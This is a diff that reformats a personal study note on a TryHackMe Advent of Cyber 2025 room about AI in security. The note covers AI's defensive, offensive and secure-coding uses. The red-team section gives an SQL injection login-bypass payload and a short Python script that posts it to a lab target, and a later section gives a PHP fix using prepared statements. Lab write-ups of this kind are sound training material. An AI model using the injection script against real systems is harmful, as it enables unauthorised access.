@@ -1,11 +1,29 @@
-# Advent of Cyber 2025 – Day 4: Beginner AI Security Tutorial (Van SolveIT)
+---
+type: resource-note
+status: done
+created: 2026-03-11
+updated: 2026-03-12
+tags: [security-writeup, tryhackme, aoc2025, ai-security]
+source: TryHackMe - Advent of Cyber 2025 Day 4
+platform: tryhackme
+room: Advent of Cyber 2025 Day 04 - AI in Security - old sAInt nick
+slug: aoc-2025-day-04-ai-in-security-old-saint-nick
+path: TryHackMe/90-events/thm-aoc-2025/Day 04 - AI in Security - old sAInt nick.md
+topic: 90-events
+domain: [web, blueteam]
+skills: [threat-modeling, triage]
+artifacts: [concept-notes, lab-notes]
+sanitized: true
+---
+
+# Advent of Cyber 2025 Day 04 - AI in Security - old sAInt nick
 
 > TryHackMe room: Advent of Cyber 2025 – Day 4
 > Theme: **AI in Cyber Security** using the fictional company **TBFC – The Best Festival Company** and their AI assistant **Van SolveIT**.
 
 ---
 
-## 1. High‑level Summary
+## Summary
 
 * TBFC replaces their old chatbot **Van Chattaty** with a new AI assistant **Van SolveIT**.
 * Goal of the room: show *practical* ways AI can support:
@@ -23,9 +41,11 @@
 
 ---
 
-## 2. Theory: AI in Cyber Security
+## Key Concepts
 
-### 2.1 Core capabilities of AI
+### 2. Theory: AI in Cyber Security
+
+#### 2.1 Core capabilities of AI
 
 | AI feature                           | Cyber‑security use                                                                                   | Chinese gloss |
 | ------------------------------------ | ---------------------------------------------------------------------------------------------------- | ------------- |
@@ -35,7 +55,7 @@
 
 > Key idea: AI is not a silver bullet. It **augments** humans by handling boring / high‑volume tasks so humans can focus on judgment‑heavy work.
 
-### 2.2 Defensive security (Blue team)
+#### 2.2 Defensive security (Blue team)
 
 * AI agents can:
 
@@ -45,7 +65,7 @@
   * In some setups, trigger automated playbooks: isolate hosts, block IPs, disable accounts.
 * Limitation: models can misclassify events or over‑react; output must be *reviewed* and bounded by rules.
 
-### 2.3 Offensive security (Red team)
+#### 2.3 Offensive security (Red team)
 
 * AI can:
 
@@ -57,7 +77,7 @@
   * Auto‑generated payloads may be **unsafe** (race conditions, DoS) or simply incorrect.
   * You must still honour **scope and rules of engagement**; don’t unleash autonomous exploitation.
 
-### 2.4 Software security
+#### 2.4 Software security
 
 * AI is weak at writing truly secure code but useful for:
 
@@ -69,7 +89,7 @@
   2. AI highlights potential issues + explains impact.
   3. Human validates and applies fixes.
 
-### 2.5 Key considerations / caveats
+#### 2.5 Key considerations / caveats
 
 * **Hallucinations**: AI can fabricate facts, APIs, or CVEs; never assume 100% correctness.
 * **Unpredictable impact**: unsafely used AI may over‑load a client system (e.g., aggressive fuzzing or concurrency bugs).
@@ -79,7 +99,7 @@
 
 ---
 
-## 3. Lab Topology & Workflow
+### 3. Lab Topology & Workflow
 
 ```mermaid
 graph LR
@@ -91,7 +111,7 @@ graph LR
 ```
 
 * **AttackBox** – the browser + terminal you use.
-* **Target** – web server at `http://<MACHINE_IP>:5000` with a PHP login form.
+* **Target** – web server at `http://TARGET_IP:5000` with a PHP login form.
 * **Van SolveIT** – AI assistant with 3 showcases:
 
   1. Red Team
@@ -100,9 +120,9 @@ graph LR
 
 ---
 
-## 4. Stage 2 – Red Team Showcase
+### 4. Stage 2 – Red Team Showcase
 
-### 4.1 Vulnerability identified
+#### 4.1 Vulnerability identified
 
 * File: `login.php`.
 * Issue: **SQL Injection (SQLi)** on the `username` field.
@@ -116,10 +136,9 @@ password = "test"
 
 > Chinese: SQL 注入 (SQL Injection) – 通过拼接恶意输入到 SQL 语句中来绕过认证或操控数据库。
 
-### 4.2 Python exploit script
+#### 4.2 Python exploit script
 
 * AI generates a simple script using the `requests` library:
-
 
 ```python
 import requests
@@ -127,7 +146,7 @@ import requests
 username = "alice' OR 1=1 -- -"
 password = "test"
 
-url = "http://MACHINE_IP:5000/login.php"  # must be updated
+url = "http://TARGET_IP:5000/login.php"  # must be updated
 
 payload = {"username": username, "password": password}
 response = requests.post(url, data=payload)
@@ -143,17 +162,16 @@ Steps:
 
    * `nano script.py` (or `vi script.py`).
    * Paste the code.
-   * Replace `MACHINE_IP` with the actual IP (e.g. `10.65.150.158`).
+   * Replace `TARGET_IP` with the actual IP (e.g. `10.65.150.158`).
 3. Run: `python3 script.py`.
 4. Inspect the response body:
 
    * Confirms **login bypass**.
    * Contains **Flag #1** for the room (paste it in the THM question).
 
+#### 4.3 Manual verification via browser
 
-### 4.3 Manual verification via browser
-
-* Navigate to `http://<MACHINE_IP>:5000/login.php`.
+* Navigate to `http://TARGET_IP:5000/login.php`.
 * Use the same credentials:
 
   * Username: `alice' OR 1=1 -- -`
@@ -172,9 +190,9 @@ FLAG{...}
 
 ---
 
-## 5. Stage 3 – Blue Team Showcase
+### 5. Stage 3 – Blue Team Showcase
 
-### 5.1 Example log line
+#### 5.1 Example log line
 
 The AI shows an HTTP access log entry similar to:
 
@@ -194,7 +212,7 @@ Breakdown:
   * `password = test`
   * Classic SQLi pattern (`OR 1=1`, comment `--`).
 
-### 5.2 What the Blue‑team AI does
+#### 5.2 What the Blue‑team AI does
 
 * Parses the log line and highlights:
 
@@ -206,7 +224,7 @@ Breakdown:
   * This is likely a **SQL injection attempt** against `/login.php`.
   * Source IP to be investigated/blocked.
 
-### 5.3 Practical lessons
+#### 5.3 Practical lessons
 
 * Even simple rules (regex on `OR 1=1`, user‑agent anomalies) can detect basic attacks.
 * AI can speed up **triage and explanation** for junior analysts.
@@ -217,9 +235,9 @@ Breakdown:
 
 ---
 
-## 6. Stage 4 – Software Security Showcase
+### 6. Stage 4 – Software Security Showcase
 
-### 6.1 Vulnerable PHP snippet
+#### 6.1 Vulnerable PHP snippet
 
 Simplified version:
 
@@ -237,7 +255,7 @@ Problems:
 * No input validation, escaping, or prepared statements.
 * Any `' OR 1=1 -- -` input fully changes the logic of the query.
 
-### 6.2 How the AI explains it
+#### 6.2 How the AI explains it
 
 * Identifies specific vulnerability: **SQL Injection**.
 * Explains why:
@@ -250,7 +268,6 @@ Problems:
   * Validate and sanitise input.
   * Apply least‑privilege DB accounts.
 
-
 Example fix (PHP + mysqli):
 
 ```php
@@ -262,74 +279,43 @@ $result = $stmt->get_result();
 
 > Takeaway: AI is a helpful *SAST assistant*, not a replacement for secure‑coding knowledge.
 
-
-
-
 ---
 
-## 7. Room Questions / Flags (placeholders)
+### 7. Room Questions / Flags (placeholders)
 
 You will encounter at least two TryHackMe questions:
 
-
-
-
 1. **Red‑team script output flag**
 
-   * Obtained from running `python3 script.py` against `http://<MACHINE_IP>:5000/login.php`.
-
-
-
-   * **Record here:** `FLAG_RED = "FLAG{...}"`.
+   * Obtained from running `python3 script.py` against `http://TARGET_IP:5000/login.php`.
+   * **Record here:** `FLAG_REDACTED`.
 
 2. **Final showcase flag**
 
    * Shown after completing all three stages and clicking **Complete Showcase** in Van SolveIT.
-
-
-
-   * **Record here:** `FLAG_FINAL = "FLAG{...}"`.
+   * **Record here:** `FLAG_REDACTED`.
 
 (Replace the placeholders with the actual flags you get in your run.)
 
-
-
-
 ---
 
-## 8. Personal Takeaways / Notes
+### 8. Personal Takeaways / Notes
 
 * **AI ≠ magic** – treat it as a powerful junior assistant:
-
-
-
   * Great at pattern‑matching, summarising, and boilerplate code.
-
-
   * Bad at guarantees, edge cases, and responsibility.
 
-
 * Always:
-
   * Verify AI‑generated exploits on a safe lab target.
-
-
   * Re‑read AI‑suggested code fixes for logic errors or security regressions.
-
-
-
   * Consider privacy before pasting real logs or proprietary source into online tools.
 
-
 * For future study:
-
   * Explore TryHackMe room **“Defending Adversarial Attacks”** to see how to harden AI models themselves.
-
-
 
 ---
 
-## 9. Mini Glossary (中英术语)
+### 9. Mini Glossary (中英术语)
 
 * **SQL Injection (SQLi)** – SQL 注入，向查询语句中插入恶意 SQL 片段的攻击方式。
 * **Red Team** – 红队，模拟攻击方，测试防御效果的团队。
